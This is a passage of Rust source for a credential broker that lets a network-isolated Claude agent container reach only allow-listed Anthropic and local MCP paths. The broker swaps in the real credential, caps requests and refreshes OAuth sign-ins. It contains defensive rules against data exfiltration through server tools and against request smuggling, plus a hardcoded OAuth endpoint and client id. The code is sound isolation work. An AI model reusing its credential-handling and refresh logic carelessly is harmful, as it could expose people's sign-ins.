//! The credential broker for Claude turns that run inside the agent container (agents-in-vm,
//! slice 1). The container has no network (`--network none`); its only way out is a Unix socket
//! this broker listens on, bind-mounted read-only at `/run/kwnt/broker.sock` and forwarded to
//! `127.0.0.1:8080` inside by socat. The CLI in there holds a stand-in credential only.
//!
//! Per request, `/t/<turn key>/<route>/<rest>`:
//! * the turn key must be a live turn of the bot whose socket the request came in on
//!   (`unknown_turn`); keys are random per turn and gone when the turn's [`TurnLease`] drops;
//! * `anthropic`: only the `(method, path)` pairs in [`ANTHROPIC_ALLOWED`] (from Gate 0,
//!   `proto/agents-in-vm/evidence/real-upstream.txt`) are forwarded, with whatever credential
//!   the container sent dropped and the real one added; at most [`DEFAULT_TURN_CAP`] per turn;
//! * `kwnt`: only the exact kwnt-local MCP paths written into this turn's config pass, to kwnt
//!   itself, headers untouched (their tokens are per turn already);
//! * anything else is refused with an Anthropic-shaped error the CLI shows as it is.
//!
//! Owning refresh: for a profile's sign-in (`OAuthFile { refresh: true }`) the broker is the
//! only refresher while isolation is on: single flight per file, re-read under the lock, the
//! file rewritten atomically (0600) with every other field kept. The host's own sign-in is never
//! refreshed here (the person's own `claude` may refresh it at the same time and one of the two
//! would be signed out); an expired one is `signin_expired`.
//!
//! The log (`<agent-vm>/broker.log`, JSON lines) has hashes only: never a credential, a turn
//! key, or a long path segment.

use futures::TryStreamExt;
use http_body_util::{combinators::UnsyncBoxBody, BodyExt, Full, Limited, StreamBody};
use hyper::body::{Bytes, Frame, Incoming};
use hyper::header::{HeaderMap, HeaderName, HeaderValue};
use hyper::{Method, Request, Response, StatusCode};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::convert::Infallible;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

pub type BrokerBody = UnsyncBoxBody<Bytes, std::io::Error>;

/// Requests to the model API one turn may make before the broker answers 429 (`request_cap`).
/// A long agentic turn makes one call per tool step; 200 is far above a normal turn and stops a
/// loop from spending the person's plan.
pub const DEFAULT_TURN_CAP: u32 = 200;
/// Largest request body forwarded (a long conversation with images stays well under it).
pub const MAX_REQUEST_BYTES: usize = 32 << 20;
/// Largest request head (request line and headers) the socket reads.
pub const MAX_HEAD_BYTES: usize = 64 << 10;
pub const ANTHROPIC_ORIGIN: &str = "https://api.anthropic.com";
/// Claude Code's own OAuth refresh endpoint and client id (CLI 2.1.316).
pub const OAUTH_TOKEN_URL: &str = "https://platform.claude.com/v1/oauth/token";
pub const OAUTH_CLIENT_ID: &str = "9d1c250a-e61b-44d9-88ed-5944d1962f5e";
/// Refresh this long before the access token runs out.
const REFRESH_MARGIN_MS: i64 = 60_000;
const LOG_ROTATE_BYTES: u64 = 5 << 20;

/// The model-API calls a Claude turn needs, and nothing else: from Gate 0 against the real API
/// (`proto/agents-in-vm/evidence/real-upstream.txt`). Each is `(method, path, allowed queries)`.
pub const ANTHROPIC_ALLOWED: &[(&str, &str, &[&str])] = &[
    // every turn, tool step and `--resume` turn
    ("POST", "/v1/messages", &["", "beta=true"]),
    // the CLI sizes a long context before compacting it
    ("POST", "/v1/messages/count_tokens", &["", "beta=true"]),
];

/// Request headers forwarded to Anthropic (an allow-list: anything else the container sent,
/// every credential included, is dropped). `x-stainless-*` are the SDK's own descriptive headers.
const ANTHROPIC_FORWARD: &[&str] = &[
    "accept", "content-type", "anthropic-version", "anthropic-beta", "user-agent", "x-app",
    "x-claude-code-session-id", "x-client-request-id", "anthropic-dangerous-direct-browser-access",
];
const ANTHROPIC_FORWARD_PREFIX: &str = "x-stainless-";

/// `anthropic-beta` values passed on (Gate 0); others are stripped and logged, not refused.
pub const KNOWN_BETAS: &[&str] = &[
    "claude-code-20250219",
    "oauth-2025-04-20",
    "interleaved-thinking-2025-05-14",
    "fine-grained-tool-streaming-2025-05-14",
    "context-management-2025-06-27",
    "context-1m-2025-08-07",
    "prompt-caching-scope-2026-01-05",
    "token-efficient-tools-2025-02-19",
    "effort-2025-11-24",
];

/// Tool `type`s a request may declare besides plain client tools (no `type`, or `custom`).
/// Every server tool (`web_search_*`, `web_fetch_*`, `code_execution_*`, ...) runs on Anthropic's
/// side and could carry the folder's data to any URL, so it is refused (Gate 0: the CLI sends none).
pub const ALLOWED_TOOL_TYPES: &[&str] = &["custom"];

/// Request headers forwarded on the `kwnt` route (the MCP client's own; its token included).
const KWNT_FORWARD: &[&str] = &[
    "accept", "content-type", "authorization", "mcp-session-id", "mcp-protocol-version", "last-event-id", "user-agent",
];

/// The only kwnt paths a turn can be given: the MCP gateway, and a permission endpoint with a
/// single opaque id. Nothing else of kwnt's API is reachable from a container.
pub fn kwnt_path_allowed(path: &str) -> bool {
    let id_ok = |id: &str| !id.is_empty() && id.len() <= 128 && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_');
    matches!(path, "/api/mcp/self" | "/api/mcp/gateway") || path.strip_prefix("/api/mcp/permission/").is_some_and(id_ok)
}

/// Header read timeout on the socket, and the longest a request body may take to arrive.
const HEADER_TIMEOUT: Duration = Duration::from_secs(10);
const BODY_TIMEOUT: Duration = Duration::from_secs(60);
/// Open connections one bot's socket serves at once; more are closed straight away.
pub const MAX_CONNECTIONS: usize = 64;

/// The status codes the broker answers with, by `code` (also in the PR description).
pub mod codes {
    pub const UNKNOWN_TURN: &str = "unknown_turn";
    pub const ROUTE_NOT_ALLOWED: &str = "route_not_allowed";
    pub const PATH_NOT_ALLOWED: &str = "path_not_allowed";
    pub const REQUEST_CAP: &str = "request_cap";
    pub const REQUEST_TOO_LARGE: &str = "request_too_large";
    pub const UPSTREAM_UNREACHABLE: &str = "upstream_unreachable";
    pub const CREDENTIAL_UNAVAILABLE: &str = "credential_unavailable";
    pub const SIGN_IN_EXPIRED: &str = "sign_in_expired";
    pub const BAD_REQUEST: &str = "bad_request";
    pub const CREDENTIAL_MISMATCH: &str = "credential_mismatch";
    pub const SERVER_TOOL_NOT_ALLOWED: &str = "server_tool_not_allowed";
    pub const REQUEST_TIMEOUT: &str = "request_timeout";
}

/// A secret that never prints.
#[derive(Clone)]
pub struct Secret(String);

impl Secret {
    pub fn new(value: impl Into<String>) -> Self {
        Self(value.into())
    }
    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "Secret(sha8={})", sha8(&self.0))
    }
}

/// Where the real Claude credential for a turn comes from.
#[derive(Clone, Debug)]
pub enum Credential {
    /// An API key (the host's `ANTHROPIC_API_KEY`, or the key a sign-in home holds).
    ApiKey(Secret),
    /// A Claude subscription sign-in file (`.credentials.json`, `claudeAiOauth`), read on every
    /// request so a refresh is picked up. `refresh`: the broker owns refreshing it.
    OAuthFile { path: PathBuf, refresh: bool },
}

impl Credential {
    pub fn is_oauth(&self) -> bool {
        matches!(self, Credential::OAuthFile { .. })
    }
}

/// A refused or failed request: the HTTP status, a stable `code`, and a sentence for the person.
#[derive(Debug, Clone)]
pub struct Deny {
    pub status: StatusCode,
    pub code: &'static str,
    pub message: String,
}

impl Deny {
    fn new(status: StatusCode, code: &'static str, message: impl Into<String>) -> Self {
        Self { status, code, message: message.into() }
    }
}

pub fn sha8(s: &str) -> String {
    if s.is_empty() {
        return "-".into();
    }
    let digest = Sha256::digest(s.as_bytes());
    digest.iter().take(4).map(|b| format!("{b:02x}")).collect()
}

/// Refuses, never normalizes, a request whose target or framing is anything but plain: an
/// absolute-form or authority-form target, `CONNECT`, a dot segment, an empty segment (`//`),
/// a percent-escape or backslash in the path, or both `Content-Length` and `Transfer-Encoding`.
/// What the allow-list then compares is exactly what the upstream receives.
pub fn check_request<B>(req: &Request<B>) -> Result<(), Deny> {
    let bad = |why: &str| Deny::new(StatusCode::BAD_REQUEST, codes::BAD_REQUEST, format!("kwnt's broker refused a malformed request ({why})"));
    if req.method() == Method::CONNECT {
        return Err(bad("CONNECT"));
    }
    if req.uri().scheme().is_some() || req.uri().authority().is_some() {
        return Err(bad("absolute-form target"));
    }
    let path = req.uri().path();
    if !path.starts_with('/') {
        return Err(bad("target"));
    }
    if path.contains('%') || path.contains('\\') {
        return Err(bad("escaped path"));
    }
    if path[1..].split('/').any(|seg| seg.is_empty() || seg == "." || seg == "..") {
        return Err(bad("path segments"));
    }
    if req.uri().query().is_some_and(|q| q.contains('#')) {
        return Err(bad("query"));
    }
    let h = req.headers();
    // hyper's buffer limit doesn't always stop a large head that arrives in one read, so the
    // head is measured here too: over MAX_HEAD_BYTES is a 431, never forwarded
    let head: usize = req.uri().to_string().len() + h.iter().map(|(n, v)| n.as_str().len() + v.len() + 4).sum::<usize>();
    if head > MAX_HEAD_BYTES {
        return Err(Deny::new(StatusCode::REQUEST_HEADER_FIELDS_TOO_LARGE, codes::REQUEST_TOO_LARGE, "The request's headers are larger than kwnt's broker forwards"));
    }
    // A body announced as larger than the broker forwards is refused before any of it is read
    let announced = h.get(hyper::header::CONTENT_LENGTH).and_then(|v| v.to_str().ok()).and_then(|v| v.trim().parse::<u64>().ok());
    if announced.is_some_and(|n| n > MAX_REQUEST_BYTES as u64) {
        return Err(Deny::new(StatusCode::PAYLOAD_TOO_LARGE, codes::REQUEST_TOO_LARGE, "The request is larger than kwnt's broker forwards"));
    }
    // Any Transfer-Encoding is refused, not only next to a Content-Length: on the socket hyper
    // drops the Content-Length of a CL+TE request before the broker sees it (RFC 9112 6.3), so
    // refusing TE is the only way to refuse CL+TE rather than normalize it. The CLI sends its
    // bodies with a Content-Length (Gate 0 checks).
    if h.contains_key(hyper::header::TRANSFER_ENCODING) {
        return Err(bad("Transfer-Encoding (send a Content-Length)"));
    }
    if h.get_all(hyper::header::CONTENT_LENGTH).iter().count() > 1 {
        return Err(bad("repeated Content-Length"));
    }
    Ok(())
}

/// A path for the log: segments that could carry a token or an id become `h:<sha8>`.
pub fn scrub_path(path: &str) -> String {
    let (p, q) = path.split_once('?').unwrap_or((path, ""));
    let seg = |s: &str| {
        if s.len() > 24 || (s.len() >= 16 && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')) {
            format!("h:{}", sha8(s))
        } else {
            s.to_string()
        }
    };
    let mut out = p.split('/').map(seg).collect::<Vec<_>>().join("/");
    if !q.is_empty() {
        let qs: Vec<String> = q
            .split('&')
            .map(|kv| match kv.split_once('=') {
                Some((k, v)) if v.len() > 12 => format!("{k}=h:{}", sha8(v)),
                _ => kv.to_string(),
            })
            .collect();
        out.push('?');
        out.push_str(&qs.join("&"));
    }
    out
}

/// What one turn may do through the broker.
#[derive(Debug, Clone)]
pub struct TurnSpec {
    /// The bot whose socket the turn's requests must come in on.
    pub bot: String,
    pub credential: Credential,
    /// kwnt's own origin (`http://127.0.0.1:<port>`), for the `kwnt` route.
    pub kwnt_origin: Option<String>,
    pub cap: u32,
}

struct TurnEntry {
    spec: TurnSpec,
    kwnt_paths: StdMutex<Vec<String>>,
    count: AtomicU32,
}

/// A live turn's registration. Dropping it ends the turn at the broker: its key stops working at
/// once, even if something in the container is still running.
pub struct TurnLease {
    broker: Arc<Broker>,
    key: String,
}

impl TurnLease {
    pub fn key(&self) -> &str {
        &self.key
    }

    /// Lets the turn reach one exact kwnt-local path (no query) through the `kwnt` route. Only
    /// [`kwnt_path_allowed`] paths can be added; returns whether it was.
    pub fn allow_kwnt_path(&self, path: &str) -> bool {
        if !kwnt_path_allowed(path) {
            return false;
        }
        match self.broker.turns.lock().unwrap().get(&self.key) {
            Some(entry) => {
                entry.kwnt_paths.lock().unwrap().push(path.to_string());
                true
            }
            None => false,
        }
    }

    /// Whether the turn asked for more model calls than its cap (the CLI then saw a 429).
    pub fn cap_reached(&self) -> bool {
        self.broker
            .turns
            .lock()
            .unwrap()
            .get(&self.key)
            .is_some_and(|e| e.count.load(Ordering::Relaxed) > e.spec.cap)
    }

    pub fn cap(&self) -> u32 {
        self.broker.turns.lock().unwrap().get(&self.key).map_or(0, |e| e.spec.cap)
    }

    /// Requests this turn made to the model API so far.
    pub fn requests(&self) -> u32 {
        self.broker
            .turns
            .lock()
            .unwrap()
            .get(&self.key)
            .map_or(0, |e| e.count.load(Ordering::Relaxed))
    }
}

impl Drop for TurnLease {
    fn drop(&mut self) {
        self.broker.turns.lock().unwrap().remove(&self.key);
    }
}

impl std::fmt::Debug for TurnLease {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "TurnLease(sha8={})", sha8(&self.key))
    }
}

#[derive(Debug, Clone)]
pub struct BrokerConfig {
    pub anthropic_origin: String,
    pub oauth_token_url: String,
    pub log_path: PathBuf,
}

impl BrokerConfig {
    pub fn new(log_path: PathBuf) -> Self {
        Self {
            anthropic_origin: ANTHROPIC_ORIGIN.into(),
            oauth_token_url: OAUTH_TOKEN_URL.into(),
            log_path,
        }
    }
}

struct Listener {
    path: PathBuf,
    task: tokio::task::JoinHandle<()>,
}

pub struct Broker {
    cfg: BrokerConfig,
    client: reqwest::Client,
    turns: StdMutex<HashMap<String, Arc<TurnEntry>>>,
    listeners: tokio::sync::Mutex<HashMap<String, Listener>>,
    refresh_locks: StdMutex<HashMap<PathBuf, Arc<tokio::sync::Mutex<()>>>>,
    log_lock: StdMutex<()>,
}

impl std::fmt::Debug for Broker {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Broker").field("cfg", &self.cfg).finish_non_exhaustive()
    }
}

const DROP_RESPONSE: &[&str] = &[
    "connection", "keep-alive", "proxy-connection", "transfer-encoding", "upgrade", "te", "trailer",
    "content-length", "set-cookie", "set-cookie2", "location", "alt-svc",
];

impl Broker {
    pub fn new(cfg: BrokerConfig) -> Arc<Self> {
        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .connect_timeout(Duration::from_secs(30))
            .read_timeout(Duration::from_secs(600))
            .no_proxy()
            .build()
            .unwrap_or_default();
        Arc::new(Self {
            cfg,
            client,
            turns: StdMutex::new(HashMap::new()),
            listeners: tokio::sync::Mutex::new(HashMap::new()),
            refresh_locks: StdMutex::new(HashMap::new()),
            log_lock: StdMutex::new(()),
        })
    }

    /// Registers a turn and returns its lease (the key goes into the container's base URL).
    pub fn register(self: &Arc<Self>, spec: TurnSpec) -> TurnLease {
        let key = uuid::Uuid::new_v4().simple().to_string();
        let entry = Arc::new(TurnEntry { spec, kwnt_paths: StdMutex::new(Vec::new()), count: AtomicU32::new(0) });
        self.turns.lock().unwrap().insert(key.clone(), entry);
        TurnLease { broker: self.clone(), key }
    }

    pub fn live_turns(&self) -> usize {
        self.turns.lock().unwrap().len()
    }

    /// Makes sure `bot` has a socket at `sock` (0600, in a 0700 folder) served by this broker.
    #[cfg(unix)]
    pub async fn listen(self: &Arc<Self>, bot: &str, sock: &Path) -> std::io::Result<()> {
        use std::os::unix::fs::PermissionsExt;
        let mut listeners = self.listeners.lock().await;
        if let Some(l) = listeners.get(bot) {
            if l.path == sock && !l.task.is_finished() && sock.exists() {
                return Ok(());
            }
            l.task.abort();
        }
        // sun_path is 108 bytes on Linux
        if sock.as_os_str().len() > 100 {
            return Err(std::io::Error::other(format!("socket path too long ({} bytes)", sock.as_os_str().len())));
        }
        let dir = sock.parent().ok_or_else(|| std::io::Error::other("socket has no folder"))?;
        std::fs::create_dir_all(dir)?;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
        let _ = std::fs::remove_file(sock);
        let listener = tokio::net::UnixListener::bind(sock)?;
        std::fs::set_permissions(sock, std::fs::Permissions::from_mode(0o600))?;
        let broker = self.clone();
        let bot_id = bot.to_string();
        let slots = Arc::new(tokio::sync::Semaphore::new(MAX_CONNECTIONS));
        let task = tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    tokio::time::sleep(Duration::from_millis(50)).await;
                    continue;
                };
                // A flood from the container closes its own extra connections, nothing else
                let Ok(slot) = slots.clone().try_acquire_owned() else {
                    drop(stream);
                    continue;
                };
                let broker = broker.clone();
                let bot_id = bot_id.clone();
                tokio::spawn(async move {
                    let _slot = slot;
                    let svc = hyper::service::service_fn(move |req| {
                        let broker = broker.clone();
                        let bot_id = bot_id.clone();
                        async move { Ok::<_, Infallible>(broker.handle(&bot_id, req).await) }
                    });
                    // hyper answers most oversized heads 431 itself; check_request catches the rest
                    let _ = hyper::server::conn::http1::Builder::new()
                        .timer(hyper_util::rt::TokioTimer::new())
                        .header_read_timeout(HEADER_TIMEOUT)
                        .max_buf_size(MAX_HEAD_BYTES)
                        .max_headers(64)
                        .serve_connection(hyper_util::rt::TokioIo::new(stream), svc)
                        .await;
                });
            }
        });
        listeners.insert(bot.to_string(), Listener { path: sock.to_path_buf(), task });
        Ok(())
    }

    #[cfg(not(unix))]
    pub async fn listen(self: &Arc<Self>, _bot: &str, _sock: &Path) -> std::io::Result<()> {
        Err(std::io::Error::other("the agent broker needs Unix sockets"))
    }

    /// Stops every socket (kwnt shutting down).
    pub async fn close_all(&self) {
        for (_, l) in self.listeners.lock().await.drain() {
            l.task.abort();
            let _ = std::fs::remove_file(&l.path);
        }
    }

    /// One request that came in on `bot`'s socket.
    pub async fn handle<B>(&self, bot: &str, req: Request<B>) -> Response<BrokerBody>
    where
        B: hyper::body::Body<Data = Bytes> + Send + 'static,
        B::Error: Into<Box<dyn std::error::Error + Send + Sync>>,
    {
        let method = req.method().clone();
        let path_q = req.uri().path_and_query().map(|p| p.as_str().to_string()).unwrap_or_default();
        let mut rec = json!({
            "bot": sha8(bot),
            "method": method.as_str(),
            "path": scrub_path(&path_q),
            "sent_cred": sha8(sent_credential(req.headers())),
        });
        let result = self.route(bot, req, &mut rec).await;
        let (resp, decision) = match result {
            Ok(r) => (r, "forward"),
            Err(d) => {
                rec["code"] = json!(d.code);
                let decision = if d.status == StatusCode::FORBIDDEN { "deny" } else { "error" };
                (deny_response(&d), decision)
            }
        };
        rec["status"] = json!(resp.status().as_u16());
        rec["decision"] = json!(decision);
        self.log(rec);
        resp
    }

    async fn route<B>(&self, bot: &str, req: Request<B>, rec: &mut Value) -> Result<Response<BrokerBody>, Deny>
    where
        B: hyper::body::Body<Data = Bytes> + Send + 'static,
        B::Error: Into<Box<dyn std::error::Error + Send + Sync>>,
    {
        check_request(&req)?;
        let path = req.uri().path().to_string();
        let query = req.uri().query().unwrap_or("").to_string();
        let mut parts = path.trim_start_matches('/').splitn(4, '/');
        let (Some("t"), Some(key), Some(route)) = (parts.next(), parts.next(), parts.next()) else {
            return Err(Deny::new(StatusCode::FORBIDDEN, codes::ROUTE_NOT_ALLOWED, "kwnt's broker only forwards a running turn's own calls"));
        };
        let rest = format!("/{}", parts.next().unwrap_or(""));
        rec["turn"] = json!(sha8(key));
        rec["route"] = json!(route);
        rec["path"] = json!(scrub_path(&format!("{rest}{}{query}", if query.is_empty() { "" } else { "?" })));
        let entry = self
            .turns
            .lock()
            .unwrap()
            .get(key)
            .filter(|e| e.spec.bot == bot)
            .cloned()
            .ok_or_else(|| Deny::new(StatusCode::FORBIDDEN, codes::UNKNOWN_TURN, super::notice::body::NO_TURN))?;
        match route {
            "anthropic" => self.anthropic(&entry, req, &rest, &query, rec).await,
            "kwnt" => self.kwnt(&entry, req, &rest, &query).await,
            _ => Err(Deny::new(StatusCode::FORBIDDEN, codes::ROUTE_NOT_ALLOWED, format!("kwnt's broker doesn't reach \"{route}\""))),
        }
    }

    async fn anthropic<B>(&self, entry: &TurnEntry, req: Request<B>, rest: &str, query: &str, rec: &mut Value) -> Result<Response<BrokerBody>, Deny>
    where
        B: hyper::body::Body<Data = Bytes> + Send + 'static,
        B::Error: Into<Box<dyn std::error::Error + Send + Sync>>,
    {
        let method = req.method().clone();
        let allowed = ANTHROPIC_ALLOWED
            .iter()
            .any(|(m, p, qs)| method.as_str() == *m && rest == *p && qs.contains(&query));
        if !allowed {
            return Err(Deny::new(
                StatusCode::FORBIDDEN,
                codes::PATH_NOT_ALLOWED,
                format!("kwnt's broker doesn't forward {method} {} to Anthropic", scrub_path(rest)),
            ));
        }
        check_credential_kind(&entry.spec.credential, req.headers())?;
        let n = entry.count.fetch_add(1, Ordering::Relaxed) + 1;
        if n > entry.spec.cap {
            return Err(Deny::new(
                StatusCode::TOO_MANY_REQUESTS,
                codes::REQUEST_CAP,
                super::notice::body::request_cap(entry.spec.cap),
            ));
        }
        let (parts, body) = req.into_parts();
        let body = read_body(body).await?;
        check_messages_body(&body)?;
        let (fwd, stripped) = anthropic_headers(&parts.headers);
        if !stripped.is_empty() {
            rec["beta_stripped"] = json!(stripped);
        }
        let url = format!("{}{rest}{}{query}", self.cfg.anthropic_origin.trim_end_matches('/'), if query.is_empty() { "" } else { "?" });
        let mut refreshed = false;
        loop {
            let (cred_headers, seen) = self.credential_headers(&entry.spec.credential).await?;
            rec["real_cred"] = json!(sha8(seen.as_deref().unwrap_or_else(|| cred_headers.values().next().and_then(|v| v.to_str().ok()).unwrap_or(""))));
            let secret = seen.clone().or_else(|| cred_headers.get("x-api-key").and_then(|v| v.to_str().ok()).map(String::from));
            let mut headers = fwd.clone();
            headers.extend(cred_headers);
            let resp = self
                .client
                .request(method.clone(), &url)
                .headers(headers)
                .body(body.clone())
                .send()
                .await
                .map_err(|e| Deny::new(StatusCode::BAD_GATEWAY, codes::UPSTREAM_UNREACHABLE, format!("Couldn't reach Anthropic: {}", without_url(&e))))?;
            if resp.status() == StatusCode::UNAUTHORIZED && !refreshed {
                if let (Credential::OAuthFile { path, refresh: true }, Some(seen)) = (&entry.spec.credential, &seen) {
                    refreshed = true;
                    rec["on_401"] = json!(self.refresh(path, seen).await.map(|r| r.as_str()).unwrap_or("refresh_failed"));
                    continue;
                }
            }
            return Ok(stream_response(resp, secret.map(Secret::new)));
        }
    }

    async fn kwnt<B>(&self, entry: &TurnEntry, req: Request<B>, rest: &str, query: &str) -> Result<Response<BrokerBody>, Deny>
    where
        B: hyper::body::Body<Data = Bytes> + Send + 'static,
        B::Error: Into<Box<dyn std::error::Error + Send + Sync>>,
    {
        let origin = entry.spec.kwnt_origin.clone();
        let listed = entry.kwnt_paths.lock().unwrap().iter().any(|p| p == rest);
        let Some(origin) = origin.filter(|_| listed) else {
            return Err(Deny::new(StatusCode::FORBIDDEN, codes::PATH_NOT_ALLOWED, "kwnt's broker only forwards this turn's own kwnt tools"));
        };
        let (parts, body) = req.into_parts();
        let body = read_body(body).await?;
        let url = format!("{}{rest}{}{query}", origin.trim_end_matches('/'), if query.is_empty() { "" } else { "?" });
        let mut headers = HeaderMap::new();
        for (k, v) in parts.headers.iter() {
            if KWNT_FORWARD.contains(&k.as_str()) {
                headers.append(k.clone(), v.clone());
            }
        }
        let resp = self
            .client
            .request(parts.method.clone(), &url)
            .headers(headers)
            .body(body)
            .send()
            .await
            .map_err(|e| Deny::new(StatusCode::BAD_GATEWAY, codes::UPSTREAM_UNREACHABLE, format!("Couldn't reach kwnt: {}", without_url(&e))))?;
        Ok(stream_response(resp, None))
    }

    /// The real credential's headers, and for a sign-in the access token they carry (to tell a
    /// stale token from a refreshed one).
    async fn credential_headers(&self, cred: &Credential) -> Result<(HeaderMap, Option<String>), Deny> {
        let mut h = HeaderMap::new();
        let bad = |_| Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::CREDENTIAL_UNAVAILABLE, "The Claude credential has characters that can't be sent");
        match cred {
            Credential::ApiKey(key) => {
                if key.expose().trim().is_empty() {
                    return Err(Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::CREDENTIAL_UNAVAILABLE, "No Claude API key is set"));
                }
                let mut v = HeaderValue::from_str(key.expose().trim()).map_err(bad)?;
                v.set_sensitive(true);
                h.insert(HeaderName::from_static("x-api-key"), v);
                Ok((h, None))
            }
            Credential::OAuthFile { path, refresh } => {
                let mut tok = read_oauth(path)?;
                if tok.expires_soon() {
                    if !*refresh {
                        if tok.expired() {
                            return Err(signin_expired());
                        }
                    } else if self.refresh(path, &tok.access).await.is_ok() {
                        tok = read_oauth(path)?;
                    } else if tok.expired() {
                        return Err(signin_expired());
                    }
                }
                let mut v = HeaderValue::from_str(&format!("Bearer {}", tok.access)).map_err(bad)?;
                v.set_sensitive(true);
                h.insert(hyper::header::AUTHORIZATION, v);
                Ok((h, Some(tok.access)))
            }
        }
    }

    fn refresh_lock(&self, path: &Path) -> Arc<tokio::sync::Mutex<()>> {
        self.refresh_locks.lock().unwrap().entry(path.to_path_buf()).or_default().clone()
    }

    /// Refreshes the sign-in in `path` unless someone already replaced `seen_access`. Single
    /// flight per file; the file keeps every field it had besides the three tokens.
    pub async fn refresh(&self, path: &Path, seen_access: &str) -> Result<RefreshOutcome, Deny> {
        let lock = self.refresh_lock(path);
        let _held = lock.lock().await;
        let mut doc: Value = std::fs::read(path)
            .ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .ok_or_else(|| Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::CREDENTIAL_UNAVAILABLE, "The Claude sign-in file can't be read"))?;
        let oauth = doc.get("claudeAiOauth").cloned().unwrap_or(Value::Null);
        if oauth["accessToken"].as_str() != Some(seen_access) {
            return Ok(RefreshOutcome::AlreadyRefreshed);
        }
        let Some(refresh_token) = oauth["refreshToken"].as_str().filter(|s| !s.is_empty()) else {
            return Err(signin_expired());
        };
        let resp = self
            .client
            .post(&self.cfg.oauth_token_url)
            .timeout(Duration::from_secs(30))
            .json(&json!({"grant_type": "refresh_token", "refresh_token": refresh_token, "client_id": OAUTH_CLIENT_ID}))
            .send()
            .await
            .map_err(|e| Deny::new(StatusCode::BAD_GATEWAY, codes::UPSTREAM_UNREACHABLE, format!("Couldn't refresh the Claude sign-in: {}", without_url(&e))))?;
        if !resp.status().is_success() {
            tracing::warn!(status = %resp.status(), file = %sha8(&path.to_string_lossy()), "Claude sign-in refresh refused");
            return Err(signin_expired());
        }
        let body: Value = resp.json().await.map_err(|_| signin_expired())?;
        let Some(access) = body["access_token"].as_str() else {
            return Err(signin_expired());
        };
        let o = doc["claudeAiOauth"].as_object_mut().ok_or_else(signin_expired)?;
        o.insert("accessToken".into(), json!(access));
        if let Some(r) = body["refresh_token"].as_str() {
            o.insert("refreshToken".into(), json!(r));
        }
        if let Some(secs) = body["expires_in"].as_i64() {
            o.insert("expiresAt".into(), json!(now_ms() + secs * 1000));
        }
        write_private(path, &serde_json::to_vec(&doc).unwrap_or_default())
            .map_err(|e| Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::CREDENTIAL_UNAVAILABLE, format!("Couldn't save the refreshed sign-in: {e}")))?;
        Ok(RefreshOutcome::Refreshed)
    }

    fn log(&self, mut rec: Value) {
        rec["t"] = json!(now_ms() as f64 / 1000.0);
        let _held = self.log_lock.lock().unwrap();
        let path = &self.cfg.log_path;
        if std::fs::metadata(path).map(|m| m.len() > LOG_ROTATE_BYTES).unwrap_or(false) {
            let _ = std::fs::rename(path, path.with_extension("log.1"));
        }
        if let Some(dir) = path.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        let mut opts = std::fs::OpenOptions::new();
        opts.create(true).append(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            opts.mode(0o600);
        }
        if let Ok(mut f) = opts.open(path) {
            let _ = writeln!(f, "{rec}");
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RefreshOutcome {
    Refreshed,
    AlreadyRefreshed,
}

impl RefreshOutcome {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Refreshed => "refreshed",
            Self::AlreadyRefreshed => "already_refreshed",
        }
    }
}

struct OAuthToken {
    access: String,
    expires_at: Option<i64>,
}

impl OAuthToken {
    fn expires_soon(&self) -> bool {
        self.expires_at.is_some_and(|t| t - now_ms() < REFRESH_MARGIN_MS)
    }
    fn expired(&self) -> bool {
        self.expires_at.is_some_and(|t| t <= now_ms())
    }
}

fn read_oauth(path: &Path) -> Result<OAuthToken, Deny> {
    let doc: Value = std::fs::read(path)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .ok_or_else(|| Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::CREDENTIAL_UNAVAILABLE, "The Claude sign-in for this bot is missing. Sign in to Claude again."))?;
    let o = &doc["claudeAiOauth"];
    let access = o["accessToken"].as_str().filter(|s| !s.is_empty()).ok_or_else(signin_expired)?;
    Ok(OAuthToken { access: access.to_string(), expires_at: o["expiresAt"].as_i64() })
}

fn signin_expired() -> Deny {
    Deny::new(StatusCode::SERVICE_UNAVAILABLE, codes::SIGN_IN_EXPIRED, "The Claude sign-in has expired. Sign in to Claude again in Settings › Accounts.")
}

/// Writes `bytes` to `path` through a 0600 temp file in the same folder and a rename.
pub fn write_private(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    let dir = path.parent().ok_or_else(|| std::io::Error::other("no folder"))?;
    let tmp = dir.join(format!(".{}.kwnt-{}", path.file_name().and_then(|n| n.to_str()).unwrap_or("f"), uuid::Uuid::new_v4().simple()));
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let result = (|| {
        let mut f = opts.open(&tmp)?;
        f.write_all(bytes)?;
        f.sync_all()?;
        std::fs::rename(&tmp, path)
    })();
    if result.is_err() {
        let _ = std::fs::remove_file(&tmp);
    }
    result
}

fn now_ms() -> i64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis() as i64).unwrap_or(0)
}

fn sent_credential(h: &HeaderMap) -> &str {
